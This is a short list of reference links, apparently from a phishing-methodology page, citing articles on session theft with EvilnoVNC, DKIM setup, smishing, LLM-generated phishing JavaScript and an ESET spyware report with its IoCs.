- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [Love? Actually: Fake dating app used as lure in targeted spyware campaign in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [ESET GhostChat IoCs and samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)

{{#include ../../banners/hacktricks-training.md}}
